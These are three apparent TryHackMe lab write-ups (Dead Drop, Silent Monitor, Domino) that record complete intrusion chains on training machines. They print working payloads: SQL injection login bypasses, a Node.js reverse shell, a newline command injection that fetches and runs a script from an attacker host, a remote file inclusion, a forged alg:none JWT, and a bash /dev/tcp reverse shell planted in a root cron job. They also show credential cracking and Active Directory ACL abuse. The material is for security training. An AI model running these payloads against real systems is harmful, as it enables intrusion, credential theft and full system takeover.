TryHackMe — Dead Drop

Multi-stage Windows Active Directory engagement. Entry through a vulnerable Node.js file-sharing app, lateral movement via APK analysis, SOCKS pivot into a segmented internal network, and domain compromise through a nested group ACL misconfiguration. Full domain admin.

TryHackMe Hard Full DA Windows AD Boot2Root Pivoting

// 01 — recon

Nmap revealed SSH (22) and a Node.js/Express app on port 80. Gobuster found no interesting directories — the entire attack surface was the login page at /internal.

nmap -sV --top-ports 100 <target-ip>

// 02 — SQL injection → login bypass

The login form was vulnerable to a basic auth-bypass injection. The app built SQL queries via direct string concatenation with no parameterisation:

SELECT id, username, role FROM users WHERE username = '' OR 1=1--' AND password = '...'

Submitting ' OR 1=1-- as the username bypassed authentication entirely, logging in as admin.

SQLiAuth Bypass

// 03 — Node.js RCE → reverse shell

The dashboard exposed a file upload feature. The server executed .js files server-side when previewed — a Server-Side JavaScript Injection vulnerability. Uploaded a Node.js reverse shell using the child_process and net modules:

(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "<attacker>", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); })();

Previewing the file triggered execution. Shell received as www-data.

SSJIRCEFile Upload

// 04 — local enumeration → credentials

Enumerated the app directory at /opt/app/. Found two critical files:

  • SQLite database — two accounts in plaintext: admin:SuperSecretAdm1n! and svc-backup:BackupAgent2024
  • shadow.bak — SHA-512 crypt hash for svc-drop. Cracked offline with john + rockyou: dropsofjupiter
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak

SSH'd in as svc-drop using the cracked password.

Cleartext CredentialsOffline Hash Cracking

// 05 — APK analysis → domain credentials

svc-drop's home directory contained a company Android APK. Extracted and analysed the compiled Dalvik bytecode (classes3.dex) using Python to extract printable strings. The Config class had hardcoded domain credentials:

python3 -c " import re data = open('classes3.dex','rb').read() strings = re.findall(b'[\x20-\x7e]{4,}', data) for s in strings: d = s.decode() if re.match(r'^[a-z]\.[a-z]{4,}$', d): print(d) "
DEFAULT_USERNAME = "j.harris" DEFAULT_PASSWORD = "DropsOfJupiter2026!"

Classic mobile app mistake — test/default credentials hardcoded and shipped in the client binary.

Hardcoded CredentialsAPK Analysis

// 06 — SOCKS pivot → internal network

The DC (192.168.11.100) was not directly reachable — only the Linux webserver (192.168.11.200) was exposed. Set up an SSH SOCKS5 proxy through the compromised host:

ssh -D 1080 svc-drop@192.168.11.200

Configured proxychains to use socks5 127.0.0.1 1080. All subsequent tools routed through the tunnel. Nmap confirmed the DC was fully accessible with all key Windows/AD ports open: Kerberos (88), LDAP (389), SMB (445), WinRM (5985), RDP (3389).

SSH SOCKS ProxyPivotingNetwork Segmentation Bypass

// 07 — WinRM → domain foothold

Used evil-winrm through the SOCKS proxy to authenticate to the DC as j.harris over WinRM (port 5985):

proxychains evil-winrm -i 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'

Shell obtained. Running whoami /all revealed j.harris was already a member of ITSupport-Admins, which is nested inside Domain Admins — granting full DA privileges transitively.

WinRMEvil-WinRMDomain Admin

// 08 — AD ACL abuse → full domain compromise

The escalation path relied on a WriteProperty ACL right. j.harris held WriteProperty on the member attribute of ITSupport-Admins — meaning they could add any user to the group. Since ITSupport-Admins is nested inside Domain Admins, adding yourself grants DA via transitive membership.

ITSupport-Admins MemberOf: Domain Admins j.harris --[WriteProperty/AddMember]--> ITSupport-Admins j.harris --[Transitive]--> Domain Admins

Flag retrieved from C:\Users\Administrator\Desktop\flag.txt.

WritePropertyAddMemberNested Group AbuseAD ACL

TryHackMe — Silent Monitor

Linux boot2root built around a Flask NOC portal. SQL injection for initial access, newline-based command injection to escape a filtered ping utility, credential hunting in app source and config files, and offline KeePass cracking to recover the root password. 2 / 2 flags.

TryHackMe Medium 2 / 2 Flags Linux Boot2Root

// 01 — recon

Nmap revealed SSH (22) and a Werkzeug/Flask app on port 5050 — "CorpNet Network Operations Centre". Gobuster found a single endpoint: /internal.

nmap -sC -sV -p- <target-ip> gobuster dir -u http://<target-ip>:5050 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

// 02 — SQL injection → login bypass

/internal presented a login form. The app built SQL queries via direct string concatenation. Submitting ' OR 1=1-- bypassed authentication entirely. Logged in as netops with operator role.

SQLiAuth BypassNo Parameterisation

// 03 — command injection via newline bypass

The dashboard exposed a Host Health Check running ping -c 2 -W 1 <input> via Python's subprocess with shell=True. The filter blocked ;, |, backticks, $, and & — but not newlines. Injected %0a via Burp Suite:

target=127.0.0.1%0awhoami

Response confirmed execution as www-data.

Command InjectionNewline Bypassshell=True

// 04 — reverse shell (filter bypass)

Direct payloads failed because > and & were filtered. Bypassed by hosting a shell script and fetching it with curl:

target=127.0.0.1%0acurl%20http://<attacker>/shell.sh%20-o%20/tmp/s.sh target=127.0.0.1%0abash%20/tmp/s.sh

Reverse shell received as www-data.

RCEFilter Bypasscurl + bash

// 05 — credential hunting → user flag

secret.config in the app directory contained plaintext backup agent credentials: S3cur3Backup$Acc3ss! for sysadmin. SSH succeeded. User flag retrieved.

Cleartext CredentialsConfig File Exposure

// 06 — KeePass cracking → root flag

infrastructure.kdbx found in sysadmin's home. Cracked master password offline with john: spring. Extracted root password from the database. su root succeeded.

keepass2john infrastructure.kdbx > keepass.hash john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"
KeePassOffline Crackingjohn

—SQLi login bypass → netops operator session
—Newline injection in ping → RCE as www-data
—curl + bash filter bypass → reverse shell
F1secret.config creds → SSH as sysadmin → user flag
F2KeePass crack (john) → root password → su root → root flag

TryHackMe — Domino

Full web exploitation chain on a Linux box — JS recon to root in 8 steps. Covers AES-ECB decryption, credential brute force, IDOR, XSS cookie hijack, JWT algorithm confusion, remote file inclusion, and cron-based privilege escalation. 5 / 5 flags.

TryHackMe Medium 5 / 5 Flags Linux Boot2Root

// 01 — recon

Nmap revealed SSH (22) and Apache HTTP (80). Gobuster found five key directories: /backup, /admin, /api, /support, and /static.

// 02 — JS recon & AES-ECB decryption

Reviewing /static/app.js revealed a hardcoded AES-128-ECB key left in a TODO comment. The /backup/ endpoint exposed config.enc. Decrypted to reveal system_user: devops.

openssl enc -d -aes-128-ecb -nosalt -nopad \ -K 4e337875734b33793230323421210000 \ -in config.enc

// 03 — brute force & IDOR → flag 1

Team page exposed all employee names in firstname.lastname format. Hydra cracked three accounts — all using password. IDOR on profile API: changing ?id=4 to ?id=1 returned Laura Hayes' profile containing Flag 1.

hydra -q -u -L usernames.txt -P rockyou.txt <ip> \ http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"

// 04 — XSS cookie hijack → flag 2

An admin bot polled support tickets and visited URLs in message bodies using Laura's admin cookie (HttpOnly: false). Created a ticket with a Netcat listener URL — bot visited, cookie captured, admin panel accessed.

Stored XSSSession HijackingHttpOnly: false

// 05 — JWT alg:none bypass

File Viewer API required admin JWT. Server trusted the alg field without validation. Forged token with alg:none and role:admin — empty signature accepted.

H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=') P=$(echo -n '{"sub":"robert.wilson","role":"admin",...}' | base64 | tr '+/' '-_' | tr -d '=') echo "$H.$P."

// 06 — RFI → reverse shell → flag 3

/api/files.php fetched remote URLs and passed them to eval(). Hosted a PHP reverse shell and triggered RCE as www-data.

curl -H "Authorization: Bearer <forged_jwt>" \ "http://<target>/api/files.php?name=http://<attacker>/shell.php"

// 07 — cleartext creds → devops → flag 4

Obscurely named PHP file in the web root contained DB credentials: D3v0ps!2024. Combined with system_user: devops from earlier — su devops succeeded. Flag 4 retrieved.

Cleartext CredentialsPassword Reuse

// 08 — writable cron script → root → flag 5

pspy64 showed root running /opt/monitoring/health_report.sh every minute. The devops group had write access. Appended a bash reverse shell — root shell within one minute.

echo 'bash -i >& /dev/tcp/<attacker>/5555 0>&1' \ >> /opt/monitoring/health_report.sh
